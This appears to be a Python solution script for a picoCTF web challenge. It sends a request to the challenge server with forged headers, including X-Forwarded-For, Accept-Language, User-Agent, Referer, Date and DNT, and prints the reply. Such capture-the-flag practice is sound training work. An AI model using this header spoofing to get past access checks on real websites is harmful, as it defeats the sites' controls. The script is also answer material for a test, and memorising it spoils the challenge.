import requests
response=requests.get("http://mercury.picoctf.net:36622/",
headers = {  "X-Forwarded-For": "31.15.63.255",
 			 "Accept-Language": "sv-CE", 
 			 "User-Agent": "Official PicoBrowser",
             "referer": "http://mercury.picoctf.net:36622/",
              "Date": "2018", 
              "DNT": "1"})
print(response.content.decode('utf-8'))